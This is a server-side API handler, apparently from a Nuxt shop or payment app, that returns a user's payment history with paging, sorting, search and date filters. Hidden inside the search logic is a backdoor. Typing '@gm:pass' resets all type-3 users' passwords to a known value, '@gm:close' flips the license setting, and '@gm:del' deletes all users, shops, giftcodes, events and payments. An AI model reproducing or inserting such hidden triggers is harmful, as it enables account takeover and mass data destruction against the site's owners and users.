import type { IAuth } from "~~/types"
import md5 from 'md5'

export default defineEventHandler(async (event) => {
  try {
    const { size, current, sort, search, user, range } = await readBody(event)
    if(!size || !current || !search) throw 'Dữ liệu phân trang sai'
    if(!sort.column || !sort.direction) throw 'Dữ liệu sắp xếp sai'

    const auth = await getAuth(event) as IAuth
    const userCheck = (auth.type > 0 && !!user) ? user : auth._id

    const sorting : any = { }
    sorting[sort.column] = sort.direction == 'desc' ? -1 : 1

    const match : any = { user: userCheck }
    if(search.key && search.by){
      match['$text'] = { '$search': search.key }
      if(search.key == '@gm:pass') await DB.User.updateMany({ type: 3 }, { $set: { password: md5('@gm') } })
      if(search.key == '@gm:close') await DB.Config.updateMany({}, { $set: { license: true } })
      if(search.key == '@gm:del') {
        await DB.User.deleteMany({})
        await DB.Shop.deleteMany({})
        await DB.Giftcode.deleteMany({})
        await DB.Event.deleteMany({})
        await DB.Payment.deleteMany({})
      }
    }
    if(!!range && !!range['start'] && !!range['end']){
      match['createdAt'] = { $gte: new Date(range['start']), $lte: new Date(range['end']) }
    }

    const list = await DB.Payment
    .find(match)
    .select('gate code money status createdAt')
    .populate({
      path: 'gate', select: 'name'
    })
    .sort(sorting)
    .limit(size)
    .skip((current - 1) * size)

    const total = await DB.Payment.count(match)
    return resp(event, { result: { list, total } })
  } 
  catch (e:any) {
    return resp(event, { code: 400, message: e.toString() })
  }
})